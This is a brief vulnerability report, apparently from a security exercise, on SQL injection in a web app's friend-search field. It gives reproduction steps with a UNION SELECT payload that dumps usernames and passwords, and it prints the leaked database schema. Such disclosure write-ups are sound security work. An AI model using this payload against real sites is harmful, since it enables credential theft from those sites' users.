# Vulnerability 1: SQL Injection in search field in /friends

- Vulnerability: SQL Injection
- Where: `search bar` in search my friends bar
- Impact: Arbitrary `SELECT` queries on the database

## Steps to reproduce

1. Register
2. Login
3. Navigate to the `'/friends'` endpoint
4. Search for `' union select username, password, 3, 4, 5 from Users; -- `
5. Collect all the passwords

[(POC)](vuln1.py)

## Impact

Severe. This allows the attacker to know all the credentials to all users (including possible admins) and to learn the schema of the DB:

```
Friends(id int, username1 varchar(20), username2 varchar(20));
FriendsRequests(id int, username2 varchar(20), username2 varchar(20));
Post(id int, author varchar(20), content text, type enum, created_at timestamp, updated_at timestamp);
Users(username varchar(20), password varchar(20), name text, about text, photo varchar(255));
```
